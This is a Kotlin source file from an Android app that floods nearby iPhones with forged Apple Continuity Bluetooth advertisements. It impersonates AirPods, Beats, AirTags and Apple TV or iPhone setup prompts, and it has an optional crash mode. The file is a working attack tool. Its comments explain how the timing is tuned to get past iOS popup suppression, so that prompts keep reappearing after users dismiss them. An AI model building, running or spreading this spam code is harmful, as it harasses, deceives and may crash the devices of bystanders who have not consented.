package com.droid.flippy

import android.os.Build
import android.util.Log
import java.util.HashMap
import java.util.Random
import java.util.concurrent.ExecutorService
import java.util.concurrent.Executors


class ContinuitySpam(private val type: ContinuityType, private val crashMode: Boolean = false) : Spammer {

    private var blinkRunnable: Runnable? = null
    @Volatile
    private var isSpamming = false

    private val executor: ExecutorService = Executors.newSingleThreadExecutor()
    private val rand = Random()

    val devices: Array<ContinuityDevice> = when (type) {
        ContinuityType.DEVICE -> arrayOf(
            ContinuityDevice("0x0E20", "AirPods Pro", ContinuityType.DEVICE),
            ContinuityDevice("0x1420", "AirPods Pro 2nd Gen", ContinuityType.DEVICE),
            ContinuityDevice("0x2420", "AirPods Pro 2nd Gen USB-C", ContinuityType.DEVICE),
            ContinuityDevice("0x2820", "AirPods 4 ANC", ContinuityType.DEVICE),
            ContinuityDevice("0x2920", "AirPods 4", ContinuityType.DEVICE),
            ContinuityDevice("0x2B20", "AirPods Max USB-C", ContinuityType.DEVICE),
            ContinuityDevice("0x2C20", "Beats Powerbeats Pro 2", ContinuityType.DEVICE),
            ContinuityDevice("0x0620", "Beats Solo 3", ContinuityType.DEVICE),
            ContinuityDevice("0x0A20", "AirPods Max", ContinuityType.DEVICE),
            ContinuityDevice("0x1020", "Beats Flex", ContinuityType.DEVICE),
            ContinuityDevice("0x0055", "AirTag", ContinuityType.DEVICE),
            ContinuityDevice("0x0030", "Hermes AirTag", ContinuityType.DEVICE),
            ContinuityDevice("0x0220", "AirPods", ContinuityType.DEVICE),
            ContinuityDevice("0x0F20", "AirPods 2nd Gen", ContinuityType.DEVICE),
            ContinuityDevice("0x1320", "AirPods 3rd Gen", ContinuityType.DEVICE),
            ContinuityDevice("0x0320", "Powerbeats 3", ContinuityType.DEVICE),
            ContinuityDevice("0x0B20", "Powerbeats Pro", ContinuityType.DEVICE),
            ContinuityDevice("0x0C20", "Beats Solo Pro", ContinuityType.DEVICE),
            ContinuityDevice("0x1120", "Beats Studio Buds", ContinuityType.DEVICE),
            ContinuityDevice("0x0520", "Beats X", ContinuityType.DEVICE),
            ContinuityDevice("0x0920", "Beats Studio 3", ContinuityType.DEVICE),
            ContinuityDevice("0x1720", "Beats Studio Pro", ContinuityType.DEVICE),
            ContinuityDevice("0x1220", "Beats Fit Pro", ContinuityType.DEVICE),
            ContinuityDevice("0x1620", "Beats Studio Buds+", ContinuityType.DEVICE),
            ContinuityDevice("0x2520", "Beats Solo 4", ContinuityType.DEVICE),
            ContinuityDevice("0x2620", "Beats Solo Buds", ContinuityType.DEVICE),
            ContinuityDevice("0x2F20", "Powerbeats Fit", ContinuityType.DEVICE),
        )
        ContinuityType.NOTYOURDEVICE -> if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            DEVICE_DATA.map { (key, value) ->
                ContinuityDevice("0x$key", "$value (NOT YOUR)", ContinuityType.NOTYOURDEVICE)
            }.toTypedArray()
        } else {
            emptyArray()
        }
        ContinuityType.ACTION -> if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
            NEARBY_ACTIONS.map { (key, value) ->
                ContinuityDevice("0x$key", value, ContinuityType.ACTION)
            }.toTypedArray()
        } else {
            emptyArray()
        }
    }

    override fun start() {
        executor.execute {
            if (devices.isEmpty()) {
                Log.w(TAG, "No Continuity devices for mode $type")
                return@execute
            }
            val bluetoothAdvertiser = BluetoothAdvertiser()
            try {
                isSpamming = true
                var loop = 0

                // Dwell pattern: hold ONE model stable for DWELL_MS, then a
                // short quiet gap before the next model. Hopping models every
                // packet (~40ms) confuses the iOS popup state machine and —
                // after the user hits X — iOS suppresses that source/type for
                // a cooldown, so flapping rarely re-triggers. A stable burst
                // + gap gives each model a real chance to pop again.
                // Shuffled cycle avoids immediate repeats.
                val order = devices.toList().shuffled(rand)
                var index = 0
                while (loop <= Helper.MAX_LOOP && isSpamming) {
                    val device = order[index]
                    index = (index + 1) % order.size
                    val deviceVal = device.value.removePrefix("0x").uppercase()

                    // Fix color per dwell so the frame looks like one stable
                    // physical device (battery/tail still randomize per packet).
                    val dwellColor = ContinuityPayloads.pickRandomColorForDevice(deviceVal, rand)

                    val dwellEnd = android.os.SystemClock.elapsedRealtime() + DWELL_MS
                    while (isSpamming && android.os.SystemClock.elapsedRealtime() < dwellEnd) {
                        val payloadBytes = when (device.deviceType) {
                            ContinuityType.DEVICE -> {
                                ContinuityPayloads.devicePayload(deviceVal, rand, dwellColor)
                            }
                            ContinuityType.NOTYOURDEVICE -> {
                                ContinuityPayloads.proximityPairPayload("01", deviceVal, dwellColor, rand)
                            }
                            ContinuityType.ACTION -> {
                                ContinuityPayloads.nearbyActionPayload(deviceVal, crashMode, rand)
                            }
                        }

                        // Apple fast path: legacy-only, non-connectable, no scan
                        // response. Extended sets + connectable + scan response is
                        // why Device never popped and Action Modal took forever.
                        try {
                            bluetoothAdvertiser.advertiseApple(payloadBytes)
                            blinkRunnable?.run()
                            BleSpamRuntime.trackSentPackets()
                        } catch (e: Exception) {
                            Log.w(TAG, "advertise: ${e.message}")
                        }

                        try {
                            Thread.sleep(appleDelayMs())
                        } catch (_: InterruptedException) {
                            break
                        }
                        loop++
                        if (loop > Helper.MAX_LOOP) break
                    }
                    if (!isSpamming) break
                    // Quiet gap: stop so iOS closes the old session before the
                    // next model starts. This is what lets popup N+1 appear
                    // after popup N was dismissed.
                    try {
                        bluetoothAdvertiser.stopApple()
                    } catch (_: Exception) {
                    }
                    try {
                        Thread.sleep(GAP_MS)
                    } catch (_: InterruptedException) {
                        break
                    }
                }
            } finally {
                isSpamming = false
                bluetoothAdvertiser.stopApple()
                // Single-use instance (a new spammer is created per toggle):
                // release the thread instead of leaking one per start.
                executor.shutdown()
            }
        }
    }

    override fun isSpamming(): Boolean = isSpamming

    override fun stop() {
        isSpamming = false
    }

    override fun setBlinkRunnable(blinkRunnable: Runnable?) {
        this.blinkRunnable = blinkRunnable
    }

    override fun getBlinkRunnable(): Runnable? = blinkRunnable

    /**
     * iOS needs ~10Hz repetition to pop quickly. The global slider can be
     * set as slow as 1000ms for other protocols, so clamp Apple to
     * 20-60ms regardless of the slider — otherwise a leftover slow
     * interval makes even fixed payloads take forever.
     */
    private fun appleDelayMs(): Long {
        return Helper.delay.coerceIn(20, 60).toLong()
    }

    companion object {
        private const val TAG = "ContinuitySpam"
        private const val DWELL_MS = 2_500L
        private const val GAP_MS = 500L

        private val DEVICE_DATA = HashMap<String, String>().apply {
            put("0E20", "AirPods Pro")
            put("0A20", "AirPods Max")
            put("0220", "AirPods")
            put("0F20", "AirPods 2nd Gen")
            put("1320", "AirPods 3rd Gen")
            put("1420", "AirPods Pro 2nd Gen")
            put("2420", "AirPods Pro 2nd Gen USB-C")
            put("2820", "AirPods 4 ANC")
            put("2920", "AirPods 4")
            put("2B20", "AirPods Max USB-C")
            put("2C20", "Beats Powerbeats Pro 2")
            put("1020", "Beats Flex")
            put("0620", "Beats Solo 3")
            put("0320", "Powerbeats 3")
            put("0B20", "Powerbeats Pro")
            put("0C20", "Beats Solo Pro")
            put("1120", "Beats Studio Buds")
            put("0520", "Beats X")
            put("0920", "Beats Studio 3")
            put("1720", "Beats Studio Pro")
            put("1220", "Beats Fit Pro")
            put("1620", "Beats Studio Buds+")
            put("2520", "Beats Solo 4")
            put("2620", "Beats Solo Buds")
            put("2F20", "Powerbeats Fit")
            put("0055", "AirTag")
            put("0030", "Hermes AirTag")
        }

        private val NEARBY_ACTIONS = HashMap<String, String>().apply {
            put("13", "AppleTV AutoFill")
            put("27", "AppleTV Connecting...")
            put("20", "Join This AppleTV?")
            put("19", "AppleTV Audio Sync")
            put("1E", "AppleTV Color Balance")
            put("09", "Setup New iPhone")
            put("02", "Transfer Phone Number")
            put("0B", "HomePod Setup")
            put("01", "Setup New AppleTV")
            put("06", "Pair AppleTV")
            put("0D", "HomeKit AppleTV Setup")
            put("2B", "AppleID for AppleTV?")
            put("05", "Apple Watch")
            put("24", "Apple Vision Pro")
            put("2F", "Connect to other Device")
            put("21", "Software Update")
            put("2E", "Unlock with Apple Watch")
            put("25", "AirDrop Sidecar")
            put("2C", "Vision Pro Setup")
        }
    }
}

